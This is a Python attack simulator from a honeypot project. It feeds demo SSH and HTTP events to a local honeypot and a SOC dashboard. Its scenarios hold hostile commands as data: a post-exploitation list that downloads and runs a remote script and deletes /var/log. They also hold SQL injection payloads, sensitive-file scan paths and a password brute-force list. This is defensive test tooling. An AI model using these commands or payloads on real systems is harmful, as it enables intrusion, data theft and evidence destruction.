"""
Attack activity simulator.

Default (no arguments): the original random SSH + HTTP activity, now also reported to the backend.

Scenarios (repeatable demo attacks):
  python honeypot/simulator/attack_simulator.py --scenario ssh_bruteforce
  python honeypot/simulator/attack_simulator.py --scenario ssh_intrusion
  python honeypot/simulator/attack_simulator.py --scenario http_scan      --target http://127.0.0.1:8080
  python honeypot/simulator/attack_simulator.py --scenario http_sqli      --target http://127.0.0.1:8080
  python honeypot/simulator/attack_simulator.py --scenario http_bruteforce --target http://127.0.0.1:8080
  python honeypot/simulator/attack_simulator.py --scenario all            --target http://127.0.0.1:8080

HTTP scenarios send REAL requests to the running HTTP honeypot, which does the reporting itself.
To make each scenario appear as a different attacker, start the honeypot with
HONEYPOT_TRUST_XFF=true (demo only); otherwise every request comes from 127.0.0.1.
SSH scenarios feed the SSH honeypot simulation directly (there is no listener yet).
"""
import argparse
import random
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from honeypot.common.logstore import LOG_DIR, append_json_log  # noqa: E402
from honeypot.common.reporter import HoneypotReporter  # noqa: E402
from honeypot.common.sensor_client import build_client_from_env  # noqa: E402

LOG_FILE = LOG_DIR / "simulator_logs.json"

# One documentation-range IP per scenario so they show up as different attackers.
SCENARIO_IPS = {
    "ssh_bruteforce": "198.51.100.23",
    "ssh_intrusion": "203.0.113.45",
    "http_scan": "192.0.2.77",
    "http_sqli": "198.51.100.91",
    "http_bruteforce": "203.0.113.12",
}


def save_log(data):
    append_json_log(LOG_FILE, data)


# ---------------------------------------------------------------- original random simulation
def simulate_ssh_activity(reporter):
    print("\n--- Simulating SSH Activity ---")
    test_ips = ["192.0.2.20", "192.0.2.30", "192.0.2.40"]
    usernames = ["admin", "root", "test", "user"]

    for _ in range(5):
        ip = random.choice(test_ips)
        username = random.choice(usernames)
        save_log({
            "timestamp": datetime.now().isoformat(),
            "ip": ip,
            "protocol": "SSH",
            "username": username,
            "login_success": False,
            "event": "login_attempt",
        })
        reporter.ssh_login(ip, username, False)
        print(f"[SSH] Failed login from {ip} using username: {username}")
        time.sleep(0.5)


def simulate_http_activity(reporter):
    print("\n--- Simulating HTTP Activity ---")
    test_ips = ["192.0.2.20", "192.0.2.30", "192.0.2.50"]
    endpoints = ["/", "/admin", "/login", "/test", "/config", "/backup"]

    for _ in range(6):
        ip = random.choice(test_ips)
        endpoint = random.choice(endpoints)
        save_log({
            "timestamp": datetime.now().isoformat(),
            "ip": ip,
            "protocol": "HTTP",
            "method": "GET",
            "request": endpoint,
            "event": "http_request",
        })
        reporter.http_request(ip, "GET", endpoint, user_agent="Mozilla/5.0 (simulator)")
        print(f"[HTTP] Request from {ip}: {endpoint}")
        time.sleep(0.5)


# ---------------------------------------------------------------- scenarios
def _http(target, path, ip, user_agent="Mozilla/5.0", form=None):
    data = urllib.parse.urlencode(form).encode() if form is not None else None
    request = urllib.request.Request(target.rstrip("/") + path, data=data,
                                     method="POST" if data is not None else "GET")
    request.add_header("User-Agent", user_agent)
    if ip:
        request.add_header("X-Forwarded-For", ip)
    try:
        urllib.request.urlopen(request, timeout=5).read()
    except urllib.error.HTTPError:
        pass  # 404s from the honeypot are expected
    except urllib.error.URLError as err:
        raise SystemExit(f"Cannot reach the HTTP honeypot at {target}: {err.reason}\n"
                         "Start it first: python honeypot/http/http_honeypot.py")


def scenario_ssh_bruteforce(reporter, ip, **_):
    print(f"\n=== SSH brute force from {ip}: 12 failed logins (expect Critical at the 10th) ===")
    users = ["admin", "root", "test", "user", "oracle", "ubuntu"]
    for i in range(12):
        reporter.ssh_login(ip, users[i % len(users)], False)
        print(f"  failed login #{i + 1}")
        time.sleep(0.15)


def scenario_ssh_intrusion(reporter, ip, **_):
    print(f"\n=== SSH intrusion from {ip}: weak-password login accepted, then post-exploitation ===")
    for name in ("root", "admin"):
        reporter.ssh_login(ip, name, False)
    reporter.ssh_login(ip, "admin", True)
    for cmd in ("whoami", "uname -a", "cat /etc/passwd", "wget http://203.0.113.9/m.sh",
                "chmod +x m.sh", "sudo ./m.sh", "rm -rf /var/log"):
        reporter.ssh_command(ip, cmd)
        print(f"  $ {cmd}")
        time.sleep(0.15)


def scenario_http_scan(reporter, ip, target, **_):
    print(f"\n=== HTTP scan from {ip} against {target}: 25 requests in a burst (scanner UA) ===")
    paths = ["/admin", "/login", "/wp-login.php", "/phpmyadmin", "/.env", "/config", "/backup",
             "/administrator", "/test", "/.git/config"]
    for i in range(25):
        _http(target, paths[i % len(paths)], ip, user_agent="Nikto/2.5.0")


def scenario_http_sqli(reporter, ip, target, **_):
    print(f"\n=== HTTP SQL injection from {ip} against {target} ===")
    payloads = ["/login?user=admin'%20OR%20'1'='1", "/test?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
                "/admin?q=';DROP%20TABLE%20users;--", "/test?id=1;SELECT%20SLEEP(5)"]
    for path in payloads:
        _http(target, path, ip, user_agent="sqlmap/1.8")
        print(f"  GET {path}")
        time.sleep(0.15)


def scenario_http_bruteforce(reporter, ip, target, **_):
    print(f"\n=== HTTP login brute force from {ip} against {target}: 12 POSTs to /login ===")
    passwords = ["123456", "password", "admin", "letmein", "qwerty", "welcome",
                 "monkey", "dragon", "111111", "abc123", "iloveyou", "root"]
    for i, pw in enumerate(passwords):
        _http(target, "/login", ip, user_agent="python-requests/2.31", form={"username": "admin", "password": pw})
        print(f"  failed login #{i + 1}")
        time.sleep(0.15)


SCENARIOS = {
    "ssh_bruteforce": (scenario_ssh_bruteforce, False),
    "ssh_intrusion": (scenario_ssh_intrusion, False),
    "http_scan": (scenario_http_scan, True),
    "http_sqli": (scenario_http_sqli, True),
    "http_bruteforce": (scenario_http_bruteforce, True),
}


def main() -> None:
    parser = argparse.ArgumentParser(description="Attack activity simulator")
    parser.add_argument("--scenario", choices=list(SCENARIOS) + ["all"], help="run a named attack scenario")
    parser.add_argument("--target", default="http://127.0.0.1:8080", help="HTTP honeypot base URL")
    parser.add_argument("--ip", help="override the simulated attacker IP")
    args = parser.parse_args()

    client = build_client_from_env()
    reporter = HoneypotReporter(client, sensor_name="attack-simulator")

    print("===================================")
    print("       ATTACK ACTIVITY SIMULATOR")
    print("===================================")
    print(f"backend sensor: {'ENABLED -> ' + client.ingest_url if client.enabled else 'DISABLED (set SENTINEL_SENSOR_API_KEY)'}")

    if args.scenario:
        names = list(SCENARIOS) if args.scenario == "all" else [args.scenario]
        for name in names:
            func, needs_http = SCENARIOS[name]
            ip = args.ip or SCENARIO_IPS[name]
            func(reporter=reporter, ip=ip, target=args.target)
        if any(SCENARIOS[n][1] for n in names):
            print("\nHTTP events are reported by the honeypot process itself. Source IPs only differ per "
                  "scenario if it runs with HONEYPOT_TRUST_XFF=true.")
    else:
        simulate_ssh_activity(reporter)
        simulate_http_activity(reporter)

    client.flush(15)
    client.close()
    print("\nSimulation completed.")
    print("Check the SOC dashboard, and honeypot/logs/simulator_logs.json for the random simulation.")


if __name__ == "__main__":
    main()
